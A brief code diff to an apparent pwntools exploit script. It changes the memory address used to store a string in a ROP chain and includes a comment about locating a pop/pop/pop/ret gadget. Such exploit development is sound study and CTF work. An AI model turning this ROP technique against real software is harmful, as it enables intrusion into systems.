@@ -30,7 +30,7 @@ def exploit(binary_path):
         rop = ROP(elf)
 
         # Calculate a valid memory address to store the string in memory
-        memory_location = elf.symbols['__data_start'] + 0x18
+        memory_location = elf.symbols['__data_start']
         log.debug(f"The address of a valid memory location to store the string is {hex(memory_location)}")
 
         # Use ROPgadget to find the address of a "pop esi ; pop edi ; pop ebp ; ret" instruction
